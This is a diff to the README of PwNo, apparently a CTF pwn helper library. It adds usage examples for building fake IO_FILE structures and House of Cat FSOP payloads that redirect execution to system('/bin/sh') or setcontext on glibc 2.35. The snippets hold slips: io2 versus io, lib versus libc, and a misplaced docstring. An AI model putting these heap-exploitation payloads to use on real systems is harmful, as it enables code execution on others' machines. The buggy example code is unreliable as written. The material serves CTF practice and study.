@@ -66,6 +66,28 @@ python exp.py -r my.challenge.pwn:11451 -l libc.so.6 # 远程调试，此时自�
 
 see [CommandArgs](#CommandArgs)
 
+### 一键模板
+
+```python
+# 快速设置！
+from pwno import *
+
+io = IO_FILE_plus()
+io._flags = 1
+io.vtable = ...
+
+send(bytes(io))
+
+
+cat = HouseOfCat()
+cat.rdi = b'/bin/sh'
+cat.call_addr = libc.sym['system']
+send(bytes(cat))
+ia()
+```
+
+
+
 ### And More ...
 
 
@@ -231,6 +253,62 @@ sh = gen_sh()  # or sh = process('./pwn')  or sh = remote('your.challenge.pwn', 
 dbg('b *$rebase(0x1145)', s=5)
 
 dbg('set follow-fork-mode parent', sh=sh)
+```
+
+
+
+### IO_FILE / IO_FILE_plus
+
+PwNo 使得你可以简便的设置 fake_IO
+
+```python
+from pwno import *
+
+io = IO_FILE_plus()
+io._flags = 1
+io.vtable = ...
+send(bytes(io))
+
+io2 = IO_FILE()
+io._IO_write_ptr = 0xdeadbeef
+io._IO_write_base = p64(0xc0decafe)
+send(bytes(io))
+```
+
+
+
+### House
+
+PwNo 提供了简便设置各种漏洞利用结构体的方法
+
+#### house_of_cat
+
+```python
+from pwno import *
+    """
+    FSOP 版本的 house_of_cat，在 2.35 下测试通过，返回一个 fake_IO payload
+        rdi: 仅能设置 rdi 指针所指向的内容
+        rdx: rdx 寄存器内容
+        fake_io_addr: fake_IO 的地址
+        call_addr: 调用的地址
+
+        e.g.
+            cat = house_of_cat()
+            cat.fake_io_addr = heap
+            cat.rdi = b"/bin/sh\x00"
+            cat.rdx = p64(0xcafec0de)
+            cat.call_addr = p64(backd00r)
+            cat.vtable = p64(libc.sym['_IO_wfile_jumps'] + 0x30)
+
+            send(bytes(cat))
+    """
+cat = HouseOfCat()
+cat.rdi = b'/bin/sh'
+cat.rdx = 0xcafec0de
+cat.call_addr = lib.sym['setcontext'] + 61
+cat.fake_io = heap
+
+send(cat)
 ```
 
 
